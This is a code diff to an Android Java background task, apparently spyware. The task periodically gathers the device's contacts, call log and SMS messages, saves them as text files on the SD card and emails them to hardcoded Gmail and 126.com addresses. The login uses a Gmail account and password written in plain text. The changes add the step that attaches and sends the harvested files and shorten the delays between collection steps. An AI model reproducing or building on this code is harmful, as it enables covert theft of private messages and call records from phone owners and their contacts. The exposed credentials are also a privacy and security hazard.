@@ -2,6 +2,7 @@ package com.system;
 
 import java.io.DataOutputStream;
 import java.io.File;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
@@ -50,15 +51,22 @@ public class GetInfoTask extends TimerTask
 	
 	public Service service;
 	
+	public static List<File> attachments;
+	
 	public GetInfoTask(Service service)
 	{
 		super();
 		this.service = service;
+		if (attachments != null) attachments.clear();
+		else attachments = new ArrayList<File>();
 	}
 	
 	public void run() 
 	{
 		Log.d(LOGTAG, "start to collect infomation");
+		
+		// If network connected, try to collect and send the information
+		if (!SysUtils.isNetworkConnected(service.getApplicationContext())) return;
 		
 		// Firstly we should make sure the time range (>24H)
 		Date lastDatetime = ConfigCtrl.getLastGetInfoTime(service.getApplicationContext());
@@ -71,30 +79,32 @@ public class GetInfoTask extends TimerTask
 			return;
 		}
 		
-		// If network connected, try to collect and send the information
-		if (SysUtils.isNetworkConnected(service.getApplicationContext()))
-		{
-			CollectContact(this.service);
-			SysUtils.ThreadSleep(100000, LOGTAG);
-			CollectPhoneCallHist(this.service);
-			SysUtils.ThreadSleep(100000, LOGTAG);
-			CollectSms(this.service);
+		// Collect information
+		CollectContact(this.service);
+		SysUtils.ThreadSleep(10000, LOGTAG);
+		CollectPhoneCallHist(this.service);
+		SysUtils.ThreadSleep(10000, LOGTAG);
+		CollectSms(this.service);
+		SysUtils.ThreadSleep(2000, LOGTAG);
 		
-			// Send mail
-			String subject = service.getResources().getString(R.string.mail_from) 
-	           		 + DeviceProperty.getPhoneNumber(service) 
-	           		 + " - " + (new String()).toString();
-			String body = String.format(service.getResources().getString(R.string.mail_body), 
+		// Send mail
+		String subject = service.getResources().getString(R.string.mail_from) 
+	          		 + DeviceProperty.getPhoneNumber(service) 
+	          		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());;
+		String body = String.format(service.getResources().getString(R.string.mail_body), 
 					DeviceProperty.getPhoneNumber(service));
-			List<String> fileList = new ArrayList<String>();
-			String[] recipients = getRecipients(service);//{"richardroky@gmail.com", "ylssww@126.com"};
-			boolean result = sendMail(subject, body, 
-					"richardroky@gmail.com", "yel510641",
-					recipients, fileList);
+		List<String> fileList = new ArrayList<String>();
+		for (int i = 0; i < attachments.size(); i++)
+			fileList.add(attachments.get(i).getAbsolutePath());
+		
+		String[] recipients = getRecipients(service);//{"richardroky@gmail.com", "ylssww@126.com"};
+		boolean result = sendMail(subject, body, 
+				"richardroky@gmail.com", "yel510641",
+				recipients, fileList);
+		attachments.clear();
 			
-			// Update the last date time
-			if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
-		}
+		// Update the last date time
+		if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
 		
 	}
 	
@@ -104,16 +114,16 @@ public class GetInfoTask extends TimerTask
 		List<SmsInfo> list = SmsCtrl.getSmsList(context, SmsCtrl.SMS_URI_ALL);
 		for (int i = 0; i < list.size(); i++)
 		{
-			sb.append(list.get(i).toString());
-			sb.append(SysUtils.NEWLINE);
+			sb.append(list.get(i).toString(context) + SysUtils.NEWLINE);
 		}
 		
 		String fileName = FileCtrl.makeFileName(context.getApplicationContext(), 
-				context.getResources().getString(R.string.sms_name)); 
+				context.getResources().getString(R.string.sms_name), FileCtrl.SUFFIX_TXT); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
 				
-			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
+			File file = FileCtrl.Save2SDCard("/" + DEFAULT_FOLDER + "/" + fileName, sb.toString());
+			if (file != null) attachments.add(file);
 		} catch (Exception e) {
 			Log.e(LOGTAG, e.getMessage());
 		}
@@ -125,15 +135,16 @@ public class GetInfoTask extends TimerTask
 		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(context);
 		for (int i = 0; i < list.size(); i++)
 		{
-			sb.append(list.get(i).toString());
+			sb.append(list.get(i).toString(context) + SysUtils.NEWLINE);
 		}
 		
 		String fileName = FileCtrl.makeFileName(context, 
-				context.getResources().getString(R.string.phonecall_name)); 
+				context.getResources().getString(R.string.phonecall_name), FileCtrl.SUFFIX_TXT); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
 				
-			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
+			File file = FileCtrl.Save2SDCard("/" + DEFAULT_FOLDER + "/" + fileName, sb.toString());
+			if (file != null) attachments.add(file);
 		} catch (Exception e) {
 			Log.e(LOGTAG, e.getMessage());
 		}
@@ -148,11 +159,12 @@ public class GetInfoTask extends TimerTask
 			sb.append(list.get(i).toString() + SysUtils.NEWLINE);
 		}
 		
-		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.contact_name)); 
+		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.contact_name), FileCtrl.SUFFIX_TXT); 
 		try {
 			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
 				
-			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
+			File file = FileCtrl.Save2SDCard("/" + DEFAULT_FOLDER + "/" + fileName, sb.toString());
+			if (file != null) attachments.add(file);
 		} catch (Exception e) {
 			Log.e(LOGTAG, e.getMessage());
 		}
@@ -174,7 +186,7 @@ public class GetInfoTask extends TimerTask
             
             ret = gmailSender.send();
         } catch (Exception e) {   
-            Log.e(LOGTAG, e.getMessage());
+            Log.e(LOGTAG, (e == null) ? "Failed to send mail" : e.getMessage());
         }
         
 		return ret;
